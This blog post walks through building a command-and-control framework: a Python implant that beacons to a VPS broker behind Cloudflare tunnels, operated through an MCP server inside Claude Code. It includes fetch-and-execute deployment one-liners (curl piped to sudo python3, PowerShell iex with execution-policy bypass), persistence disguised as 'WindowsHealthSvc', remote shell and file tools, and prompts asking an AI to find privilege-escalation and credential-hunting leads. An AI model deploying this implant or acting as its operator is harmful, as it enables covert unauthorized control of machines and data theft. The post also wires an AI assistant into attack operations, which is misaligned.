---
title: How to Create a Makeshift C2 with Claude Code as the Operator
header:
  teaser: "/assets/images/claude_c2.png"
categories:
  - C2
tags:
  - Claude Code
  - MCP
  - C2
  - Python
  - VPS
  - '2026'
  - Cloudflare Tunnels
  - g3tsyst3m
---

I've been wanting to build my own basic C2 using AI as a controller ever since I first started dabbling in Claude Code and its MCP integration. When I dug a bit deeper into what all the MCP protocol could accomplish, I knew I had to explore it further from more of an offensive security angle. In short, MCP is a standardized way to give an AI assistant structured tools it can call, similar to functions. I figured if I can expose my C2's operator actions as MCP tools, then Claude isn't just sitting in a chat window answering questions. It becomes the actual operator interface. I run a command, get output, ask a follow-up question, pivot based on the answer. All of it handled within one continuous session without switching contexts or copy-pasting between windows. Sounds pretty cool right?

The idea sat in the back of my head for a while before I actually built it. I kept thinking it would be more complicated than it was. It wasn't. A week of building out the Python code, a generously priced VPS ($5/mo!!!), a free Cloudflare account using a domain I already owned. That's pretty much the whole bill of materials.

What came out of this project is yet another lightweight Python-based C2 from yours truly, but this time AI powered. Here's what's happening under the hood:

- Agents run on standard Python stdlib. Zero external dependencies. We download a zipped portable Python, unzip it, and we're set!
- The VPS broker is a small Flask server backed by SQLite
- The whole thing is exposed over stable Cloudflare named tunnels secured with Cloudflare WAF rules
- Operator control happens through **MCP tools directly inside Claude Code**
- **Bonus for subscribers**: A PyQt6 GUI C2 console for point-and-click operation that also integrates with Claude outside of the terminal!

> The end result: agents that beacon in from Windows and Linux targets, shell commands and file reads through natural language in Claude Code, and infrastructure that hides behind Cloudflare tunnels with stable hostnames. Let's get going then shall we 😸

---

## Why MCP as the Operator Interface?

This is the part that makes this setup different. Claude Code can connect to any MCP server and call its tools natively. When I expose my C2's operator functions as MCP tools, I can type `list_agents()` or `run_shell("target-hostname", "whoami")` directly in a Claude Code conversation and get back output with full AI context. I can ask Claude to analyze results, chain commands, write scripts, and pivot.  All without leaving the editor.

This isn't "AI running my C2 autonomously." It's a tight integration where Claude has access to operator tools and I'm driving the session. Think of it like having the C2 client built into your IDE. 😸

It's as easy as typing **list_agents()** and I immediately get a quick overview on what my agent landscape looks like:

<img width="1571" height="917" alt="image" src="https://github.com/user-attachments/assets/d3d8a281-7f8a-4d2f-afba-579baa7bb33c" />

I can even broadcast a message to all agents at once:

<img width="671" height="379" alt="image" src="https://github.com/user-attachments/assets/2339f668-37f5-4e4d-b5a4-b0e5281df82a" />

That's just a very simplistic overview, but honestly, the sky's the limit.  All with the ease of using natural language to deliver tasks to each respective agent. 😺

---

## Architecture Overview

```
[Agent on target]  -->  HTTPS beacon  -->  [Cloudflare Tunnel]
                                                    |
                                         [Flask listener on VPS]
                                                    |
                                           [SQLite task queue]
                                                    |
                                         [FastMCP server on VPS]
                                                    |
                                    [Cloudflare Tunnel (MCP endpoint)]
                                                    |
                                        [Claude Code on your machine]
```

Three moving parts:

- **listener.py**: Flask app on the VPS. Handles agent enrollment, beaconing, and task dispatch. Also manages the MCP subprocess lifecycle.
- **svc.py**: The agent. Runs on target machines. Phones home every second, executes queued tasks, returns results.
- **remote_agent_server.py**: FastMCP server. Exposes operator tools to Claude Code over HTTP.

Everything communicates over HTTPS through named Cloudflare tunnels, so the VPS IP is never exposed and hostnames never change even if the VPS reboots.

---

## The VPS: IONOS Cloud

I went with [IONOS](https://www.ionos.com) for the VPS and it's been solid. Their entry-level Linux VPS runs around $5/mo ($2/mo for first 3 months), which is hard to argue with for a dedicated C2 box. Setup is straightforward: pick a Linux distro (I went with Debian 12 Bookworm), IONOS hands you an IP and root SSH credentials, SSH in. That's it.

A few things I liked about IONOS for this use case (not sponsored, I promise 😅):

- **Static IP**: VPS IP doesn't change between reboots. Useful for SSH and ad-hoc access.
- **No outbound port restrictions**: Some cheap VPS providers block outbound HTTPS or throttle UDP. IONOS doesn't, and the Cloudflare tunnel runs on HTTPS outbound.
- **Easy firewall management**: Simple inbound/outbound port rule configuration.
- **No hidden costs**: Seriously, I'm not kidding.  I pay literally $5.03 /mo with no extras for bandwidth usage, disk IO, nothing additional.  It's a flat rate every month.  It's a barebones setup that isn't a powerhouse by any stretch of the imagination, but it gets the job done.

---

## Prerequisites for the Full Setup

- A VPS running Linux (Debian/Ubuntu recommended)
- A domain you control with Cloudflare as the DNS provider (free tier works)
- Python 3.10+ on the VPS
- `cloudflared` installed on the VPS
- Claude Code installed locally on main controller/attacker PC (desktop app or `npm install -g @anthropic-ai/claude-code`)

**VPS initial setup:**

```bash
apt update && apt upgrade -y
apt install -y python3 python3-pip git curl

pip3 install flask mcp uvicorn

curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
  -o /usr/local/bin/cloudflared
chmod +x /usr/local/bin/cloudflared

mkdir -p /root/remoteagents && cd /root/remoteagents
```

---

## Cloudflare Named Tunnels

Named tunnels give us stable hostnames that survive VPS reboots and IP changes. Without them you get a random `trycloudflare.com` URL that changes on every restart, meaning you'd have to re-register with Claude Code and update agent configs constantly. Named tunnels fix that permanently.

We create three subdomains off a single tunnel: one for agent beaconing, one for the MCP server, and one for agent enrollment and file serving.

```bash
cloudflared tunnel login
cloudflared tunnel create remote-agent
```

Create `~/.cloudflared/config.yml`:

```yaml
tunnel: remote-agent
credentials-file: /root/.cloudflared/<your-tunnel-id>.json

ingress:
  - hostname: agent-vps.yourdomain.com
    service: http://localhost:8080
  - hostname: mcp-vps.yourdomain.com
    service: http://localhost:8765
  - hostname: init-vps.yourdomain.com
    service: http://localhost:8080
  - service: http_status:404
```

Route the DNS records:

```bash
cloudflared tunnel route dns remote-agent agent-vps.yourdomain.com
cloudflared tunnel route dns remote-agent mcp-vps.yourdomain.com
cloudflared tunnel route dns remote-agent init-vps.yourdomain.com
```

The listener and init endpoints both point to port 8080 but are routed by hostname. This split lets us apply different Cloudflare WAF rules to each.  Agents can always reach `/c2/beacon` on agent-vps, but the MCP endpoint (mcp-vps) gets locked down to your operator IP only.

One `cloudflared` process handles all three subdomains from one outbound connection. The VPS has zero open inbound ports. No firewall rules to manage, no SSL certificates to renew.  Cloudflare handles TLS termination at their edge.

Rather than running cloudflared as a separate service, `listener.py` spawns it in a background thread on startup, so when systemd starts the listener, the tunnel comes up with it automatically.

---

## Shared Config (agent_config.py)

**`agent_config.py`** lives on the VPS at `/root/remoteagents/agent_config.py` and is the single source of truth for constants shared between `listener.py` and `remote_agent_server.py`:

```python
AGENT_ID = "vps"

DOMAIN        = "yourdomain.com"
SECRET        = "change_this_to_a_long_random_string"
ENROLL_KEY    = "change_this_to_another_random_string"
MCP_PORT      = 8765
LISTENER_PORT = 8080

TUNNEL_NAME   = "remote-agent"
LISTENER_URL  = f"https://agent-{AGENT_ID}.{DOMAIN}"
MCP_URL       = f"https://mcp-{AGENT_ID}.{DOMAIN}"
INIT_URL      = f"https://init-{AGENT_ID}.{DOMAIN}"
```

Generate both secrets with: `python3 -c "import secrets; print(secrets.token_urlsafe(32))"`

`SECRET` authenticates every operator API call and every agent beacon. `ENROLL_KEY` gates access to the agent files served over HTTP (`/svc.py`, `/install.py`, `/bootstrap.ps1`). Agents never store `SECRET` or `LISTENER_URL` on disk.  They only know `INIT_URL` and `ENROLL_KEY`. The real credentials are handed to the agent at runtime by the enrollment endpoint.

---

## The Database Layer (broker_db.py)

`broker_db.py` is the connective tissue between the three processes that share state: the Flask listener, the MCP server, and any other tooling you add. All coordination goes through a single SQLite file on disk rather than an in-process message queue or IPC layer.

**Why SQLite?** A $5 VPS running a handful of agents has no need for a networked database server. SQLite with WAL mode (`PRAGMA journal_mode=WAL`) lets the listener and MCP server both query `c2.db` simultaneously without locking each other out. One file, zero configuration, survives a reboot without a service to restart.

**Three tables:**

- **`agents`**: upsert table. Each beacon writes the agent's current hostname, OS, username, and IP. The `last_seen` timestamp determines online/offline status: anything that beaconed within the last 30 seconds is considered online.

- **`tasks`**: a queue with explicit status transitions. A task starts as `pending`, gets atomically moved to `claimed` when an agent picks it up via `pop_tasks()`, and becomes `done` when the result comes back. The atomic claim prevents a race where two rapid beacons both pick up the same task.

- **`results`**: stores output and exit code from each completed task, keyed by `task_id`. The MCP server polls this table every 500ms after queuing a task, waiting for the row to appear.

**The flow end to end.** When you type "run ipconfig on the Windows agent" in Claude Code:

1. MCP server calls `queue_task()`: inserts a row into `tasks` with status `pending`
2. Flask listener wakes the parked beacon via `threading.Event`
3. Agent's next beacon calls `pop_tasks()`: atomically claims the row
4. Agent executes the command, bundles the result into the next beacon
5. Listener calls `store_results()`: inserts a row into `results`, marks task `done`
6. MCP server's polling loop finds the result row and returns output to Claude Code

The entire round trip takes 1 to 2 seconds under normal conditions, entirely mediated by SQLite reads and writes.

---

## The Flask Listener (listener.py)

`listener.py` is the core of the VPS side. It has three distinct responsibilities:

**Agent enrollment (`/init`).** Agents POST their ID plus an HMAC-SHA256 token derived from `ENROLL_KEY`. The listener verifies the HMAC and, if valid, hands back the real `LISTENER_URL` and `SECRET`. Nothing sensitive is stored on disk on the agent. If you burn an agent binary on a target, the attacker gets an enrollment key and a staging URL.  Not your active C2 address. Rate limiting (60 enrollments per IP per hour) prevents `/init` from being hammered.

**The beacon loop (`/c2/beacon`).** This is the core C2 channel. Agents POST here carrying their system info plus completed task results. The listener writes metadata to SQLite, stores results, then checks for queued tasks. If there are none, it parks the request on a `threading.Event` for up to 15 seconds.  This is long polling. When a task gets queued through Claude Code, `ev.set()` wakes the parked beacon immediately. Task delivery feels instant from the operator side while the agent only makes ~4 requests per minute instead of 60.

**MCP subprocess lifecycle (`/mcp/start`, `/mcp/stop`, `/mcp/status`).** The MCP server runs as a child process of the listener, started on demand via authenticated POST. Both processes share the same `c2.db`:  the MCP server writes task rows, the listener delivers them on the next beacon. The MCP server can crash and restart without losing queued work.

Key routes at a glance:

| Route | Purpose |
|---|---|
| `POST /init` | Agent enrollment, returns C2 credentials |
| `POST /c2/beacon` | Agent checkin, task delivery, result collection |
| `POST /c2/task` | Operator queues a shell command |
| `GET /c2/agents` | List all agents with online/offline status |
| `GET /c2/results/<id>` | Poll for a completed task result |
| `POST /c2/agent/remove` | Remove an agent and all its data |
| `POST /mcp/start` | Launch the FastMCP server subprocess |
| `GET /svc.py?enroll=KEY` | Serve agent script (gated by ENROLL_KEY) |
| `GET /bootstrap.ps1?enroll=KEY` | Serve Windows bootstrap (gated by ENROLL_KEY) |

---

## The MCP Server (remote_agent_server.py)

This is what Claude Code talks to. It's built on [FastMCP](https://github.com/jlowin/fastmcp).  This is a decorator-based Python MCP framework that handles all the protocol plumbing.

Each operator tool is a decorated function. FastMCP registers it, generates the schema, and handles serialization:

```python
mcp = FastMCP("c2-broker")

@mcp.tool()
async def run_shell(agent_id: str, command: str, timeout: float = 30) -> str:
    """Run a shell command on a remote agent and return the output."""
    return await _queue_and_wait(agent_id, "shell", {"command": command}, timeout=timeout)
```

The core mechanism is `_queue_and_wait()`.  It writes a task to SQLite, then polls the results table every 500ms until the agent completes it or it times out:

```python
async def _queue_and_wait(agent_id, task_type, payload, timeout=30):
    task_id = db.queue_task(agent_id, task_type, payload)
    deadline = asyncio.get_event_loop().time() + timeout + 10

    while asyncio.get_event_loop().time() < deadline:
        await asyncio.sleep(0.5)
        result = db.get_result(task_id)
        if result:
            return f"EXIT CODE: {result['exit_code']}\n{result['output']}"

    return f"Timeout: agent '{agent_id}' did not respond within {timeout}s."
```

The extra 10 seconds beyond the stated timeout accounts for beacon roundtrip latency.

The server wraps FastMCP's ASGI app with a Bearer token middleware that checks the `Authorization` header on every request before anything reaches the MCP layer.

**Full tool list:**

| Tool | What It Does |
|---|---|
| `list_agents()` | Show all agents, online/offline |
| `run_shell(agent_id, command)` | Run shell command, wait for output |
| `launch_detached(agent_id, command)` | Fire-and-forget background process |
| `read_file(agent_id, path)` | Read a file from the agent |
| `write_file(agent_id, path, content)` | Write a file to the agent |
| `list_dir(agent_id, path)` | Directory listing |
| `get_sysinfo(agent_id)` | Last-known beacon metadata |
| `broadcast(command)` | Run on ALL online agents simultaneously |
| `kill_agent(agent_id)` | Send shutdown signal |
| `vps_shell(command)` | Run directly on the VPS |

> Examples:

<img width="989" height="731" alt="image" src="https://github.com/user-attachments/assets/d5503d50-a702-43e6-bc7a-4574870e3442" />

<img width="1869" height="794" alt="image" src="https://github.com/user-attachments/assets/878c8657-eeaf-4740-b502-fd678b5f3293" />

---

## The Agent (svc.py)

The agent is built around one constraint: zero external dependencies. It uses only Python stdlib (`urllib`, `subprocess`, `threading`, `time`, `json`, `platform`). Drop it on any machine with Python 3.8+ and it runs.

**Staged enrollment.** On first startup the agent only knows `INIT_URL` and `ENROLL_KEY`. It derives an HMAC token from its unique agent ID and POSTs to `/init`:

```python
def _get_c2_config(agent_id):
    token = hmac.new(ENROLL_KEY.encode(), agent_id.encode(), hashlib.sha256).hexdigest()
    resp  = _http_post(INIT_URL, {"agent_id": agent_id, "token": token})
    return resp["c2_url"], resp["secret"]
```

The listener verifies the HMAC and returns the real C2 URL and secret. The agent never writes these to disk. If the agent gets a 401 or 403 on a beacon, it automatically re-enrolls.

**The beacon loop.**

```python
while True:
    with _results_lock:
        results = list(_pending_results)
        _pending_results.clear()
    try:
        resp  = beacon(results)
        tasks = resp.get("tasks", [])
        for task in tasks:
            threading.Thread(target=_run_task_thread, args=(task,), daemon=True).start()
        if tasks:
            _results_ready.wait(timeout=30)
            _results_ready.clear()
        else:
            time.sleep(BEACON_INTERVAL)
    except BaseException as e:
        _log(f"beacon error: {type(e).__name__}: {e}")
        time.sleep(backoff)
        backoff = min(backoff * 2, MAX_BACKOFF)
```

Two things here that are easy to miss. `except BaseException` (not `Exception`) is intentional.  `KeyboardInterrupt` and `SystemExit` are not subclasses of `Exception`, so catching `Exception` only would silently swallow a Ctrl+C and keep the agent running. And the `else: time.sleep(BEACON_INTERVAL)` on the no-tasks branch is critical.  Without it, when the long poll returns empty the agent hammers the beacon endpoint in a tight loop.

Results are bundled into the next beacon rather than making a separate HTTP call. Each beacon is one POST: check in, receive tasks, submit results from the previous cycle.

**Single-instance lock.** On Windows a named mutex prevents duplicate agents. On Linux, `fcntl.flock()` on a lock file does the same.

**Task types the agent handles:** `shell`, `launch` (detached background process), `read_file`, `write_file`, `list_dir`, `shutdown`, `restart`.

**Persistence.**
- Windows: auto-detects privilege level. Admin installs to `C:\ProgramData\WindowsHealthSvc\` with an HKLM Run key. Standard user installs to `%APPDATA%\WindowsHealthSvc\` with an HKCU Run key. Either way `pythonw.exe` (or the embedded `python.exe`) is used so there's no console window.
- Linux: systemd service with `Restart=always`.

---

## Running the Listener as a Service

Create `/etc/systemd/system/c2-listener.service`:

```ini
[Unit]
Description=C2 Listener
After=network.target

[Service]
WorkingDirectory=/root/remoteagents
ExecStart=/usr/bin/python3 /root/remoteagents/listener.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
```

```bash
systemctl daemon-reload
systemctl enable c2-listener
systemctl start c2-listener
```

Keep the MCP server auto-recovering if it drops after a listener restart:

```bash
cat > /root/remoteagents/ensure_mcp.sh << 'EOF'
#!/bin/bash
if ! pgrep -f remote_agent_server.py > /dev/null 2>&1; then
    curl -s -X POST http://localhost:8080/mcp/start \
        -H "Content-Type: application/json" \
        -d '{"secret":"your_secret_here"}' > /dev/null 2>&1
fi
EOF
chmod +x /root/remoteagents/ensure_mcp.sh
apt-get install -y cron && systemctl enable cron && systemctl start cron
(crontab -l 2>/dev/null; echo "* * * * * /root/remoteagents/ensure_mcp.sh") | crontab -
```

`listener.py` starts on every boot automatically and brings the Cloudflare tunnel up with it. The cron job ensures the MCP server recovers within a minute of any listener restart.

---

## Deploying Agents

**Linux / Raspberry Pi (as root):**
```bash
curl -s "https://init-vps.yourdomain.com/install.py?enroll=your_enroll_key" | sudo python3
```

**Windows (no Python required.  Uses portable embeddable Python):**
```powershell
powershell -ep bypass -c "iex (iwr 'https://init-vps.yourdomain.com/bootstrap.ps1?enroll=your_enroll_key' -UseBasicParsing).Content"
```

<img width="1263" height="325" alt="image" src="https://github.com/user-attachments/assets/82a24044-eeb7-40ee-9875-3196d5d82d2a" />

<img width="1282" height="448" alt="image" src="https://github.com/user-attachments/assets/004bbd32-444a-424d-9187-c8220bb85446" />

<img width="1852" height="573" alt="image" src="https://github.com/user-attachments/assets/0b69faab-c5d5-4f23-8eac-16bae9216eb5" />

The Windows bootstrap checks for an existing Python install first. If none is found it silently downloads the Python embeddable package (~10MB zip), extracts it locally, downloads `svc.py`, sets an HKCU Run key, and launches the agent. No MSI, no winget, no UAC prompt. Under 30 seconds on a decent connection.

Within 5 seconds of the agent starting you'll see it appear in `list_agents()`.

The agent generates a unique ID on first run (`<hostname>-sys-<4 random chars>`) and persists it to a local file so the ID stays stable across reboots.

---

## Operating Without Claude

Before MCP mode, it's worth knowing how to interact with the C2 directly. MCP and the GUI are conveniences.  Underneath everything is a plain HTTP API you can hit from any terminal. This matters when we're on a machine without Claude Code, scripting from a CI box, or just want to sanity-check the server is alive.

### commander.py CLI

`commander.py` is a Python CLI that wraps the HTTP API. It runs on your operator machine (not the VPS) and only requires `pip install requests`.

**Run a command directly on the VPS from your attacker machine** (not on an agent.  This runs on the VPS itself):
```powershell
py commander.py execute "whoami"
py commander.py execute "ps aux"
```

Output:
```
[>] execute: whoami
[OK]
root
```

> Example:

<img width="670" height="865" alt="image" src="https://github.com/user-attachments/assets/a0cfe509-b743-41d1-b555-c8b2ad499eab" />


**File transfer:**
```powershell
py commander.py download /root/remoteagents/c2.db
py commander.py upload new_svc.py /root/remoteagents/svc.py
```

**MCP server lifecycle:**
```powershell
py commander.py mcp-start      # starts remote_agent_server.py on the VPS
py commander.py mcp-stop       # kills it
py commander.py mcp-status     # is it running?
py commander.py mcp-logs       # last 100 lines of MCP server log
```

### Tasking Agents via curl

The agent tasking flow is two steps: queue a task, poll for the result. The `task_id` ties them together.

**Queue a shell command:**
```bash
curl -s -X POST https://agent-vps.yourdomain.com/c2/task \
  -H "Content-Type: application/json" \
  -d '{"secret":"your_secret_here","agent_id":"workstation-sys-ab12","cmd":"whoami"}'
```
```json
{"status": "ok", "task_id": "3f8a1c2d-7e44-4b0a-91fc-abc123def456"}
```

**Poll for the result:**
```bash
curl -s "https://agent-vps.yourdomain.com/c2/results/workstation-sys-ab12?secret=your_secret_here&task_id=3f8a1c2d-7e44-4b0a-91fc-abc123def456"
```
```json
{"status": "ok", "result": {"output": "workstation\\alice", "exit_code": 0}}
```

If the agent hasn't beaconed yet you'll get `{"status": "pending"}`   just poll again in a few seconds.

**List all registered agents:**
```bash
curl -s "https://agent-vps.yourdomain.com/c2/agents?secret=your_secret_here" | python3 -m json.tool
```

---

## Wiring Up Claude Code

Add the MCP server to Claude Code's settings (`~/.claude/settings.json`):

```json
{
  "mcpServers": {
    "remote-vps": {
      "type": "http",
      "url": "https://mcp-vps.yourdomain.com/mcp",
      "headers": { "Authorization": "Bearer your_secret_here" }
    }
  }
}
```

Start the MCP server on the VPS:

```bash
curl -s -X POST http://localhost:8080/mcp/start \
  -H "Content-Type: application/json" \
  -d '{"secret":"your_secret_here"}'
```

Then open Claude Code. The MCP tools appear automatically and are ready to use.

---

## Daily Workflow (MCP Mode)

Once everything is running, operator sessions look like this in Claude Code:

```
> list_agents

Agents: 3 total, 2 online

AGENT ID                  HOSTNAME        OS           USER    IP              STATUS
--------------------------------------------------------------------------------------
workstation-sys-ab12      WORKSTATION     Windows 11   alice   192.168.1.10    ONLINE
server-sys-cd34           FILESERVER      Windows 11   SYSTEM  192.168.1.20    ONLINE
raspi-sys-ef56            raspberrypi     Linux 6.1    root    192.168.1.50    offline (142s ago)


> run_shell("workstation-sys-ab12", "whoami /priv")

EXIT CODE: 0
PRIVILEGE INFORMATION
Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
...
```

Because this is happening inside Claude Code, you can immediately follow up: *"Which of those privileges are interesting for local privesc?"* and Claude answers with full context of the output it just received. That continuous session context is the part that makes this feel genuinely different from a traditional implant framework.

---

## After a Restart

`listener.py` and the Cloudflare tunnel come back automatically via systemd. The MCP server is on-demand, so:

```powershell
py commander.py mcp-start
claude --resume
```

The stable tunnel URL means no re-registration. Agents reconnect on their next beacon cycle.

---

🎁 ***Bonus Content for Members! (All Tiers)*** 🎁
-

## The Claude Skills.md file to setup everything covered in this Blog Post

Don't want to trudge through all the source code?  Just point this skill file to Claude and let Claude do all the heavy lifting for you! 😺

This will setup everything you need from start to finish.  It's very comprehensive and should make for an easy install

[Claude Skills File](https://ko-fi.com/s/95b4255fc2)

## The C2 GUI 

[Code for the C2 PYQT GUI](https://ko-fi.com/s/4603f26d83)

Full transparency, I vibe coded this 😸

For situations where you want a point-and-click interface outside Claude Code, `c2_console.py` is a PyQt6 GUI that talks to the same `listener.py` HTTP API.

<img width="1914" height="996" alt="image" src="https://github.com/user-attachments/assets/486c902e-6937-4696-9e6f-aa3d4de2924d" />

<img width="1072" height="478" alt="image" src="https://github.com/user-attachments/assets/8c1ce662-46a4-48b1-964d-5eda1b46637c" />

Agents appear in a tree view color-coded by status (gold for primary target, green for online, dim gray for offline). Right-click any agent for quick commands that auto-select the right variant for the platform -- `ipconfig /all` on Windows, `ip addr` on Linux, etc.

The **Ask Claude** button is the part I'm most happy with. It opens a dialog with the current output pane pre-loaded as context. You type a question and it streams a response from `claude -p` directly into the dialog. Run `tasklist`, click Ask Claude, ask "Anything interesting here from a persistence or credential hunting perspective?" -- instant analysis without copy-pasting.

---

## What I'd Do Differently

A few things that would make this more production-hardened:

- **Encrypted payloads**: tasks and results are currently plaintext JSON. HTTPS handles transport encryption but payload-level encryption would protect against a compromised broker SQLite.
- **Implant hardening**: `svc.py` sits on disk in plaintext. For anything beyond a lab you'd want it packed or loaded from memory.
- **The Obvious...Add More Commands!**: I just threw this together to demonstrate the capabilities of Claude in managing a mimimal C2 setup.  If I really grew this out more, I'd add privilege escalation, BOF options, etc.

---

## Wrapping Up

Having Claude Code as your operator console means analysis, pivoting, and post-exploitation research all happen in the same context. You run a command, get output, ask a question about it, and follow up.  All in one flowing session. That's the part I didn't fully anticipate when I started building this, and it's the part I'd keep even if I ditched everything else.

All Source Code is in the repo, linked below. If you have questions drop them in the comments or hit me up on Discord

[Source Code](https://github.com/g3tsyst3m/CodefromBlog/tree/main/2026-6-26-How%20to%20Create%20a%20Makeshift%20C2%20with%20Claude%20Code%20as%20the%20Operator)

---

<div style="text-align: right;">
  
<b>Sponsored By:</b><br>

<img width="200" height="130" alt="image" src="https://raw.githubusercontent.com/g3tsyst3m/g3tsyst3m.github.io/refs/heads/master/assets/images/anyrun.png" />

<img width="200" height="130" alt="image" src="https://raw.githubusercontent.com/g3tsyst3m/g3tsyst3m.github.io/refs/heads/master/assets/images/vector35.png" />

</div>


